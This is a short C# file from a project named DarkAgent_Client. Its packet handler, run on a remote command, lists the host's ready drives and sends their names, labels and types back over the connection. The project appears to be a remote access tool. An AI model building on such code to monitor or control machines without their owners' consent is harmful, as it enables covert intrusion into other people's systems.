using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using DarkAgent_Client.src.Objects;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_FileMgrGetDrives : ReceiveBasePacket
    {
        public R_FileMgrGetDrives(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        public override void Read()
        {
        }

        public override void Run()
        {
            DriveInfo[] Drives = DriveInfo.GetDrives();

            foreach (DriveInfo Drive in Drives)
            {
                if (Drive.IsReady)
                {
                    FileMgrDrives info = new FileMgrDrives();
                    info.Drive = Drive.Name;
                    info.Caption = Drive.VolumeLabel;
                    info.type = Drive.DriveType.ToString();
                    Client.SendPacket(new S_FileMgrGetDrives(Client, info));
                }
            }
        }
    }
}
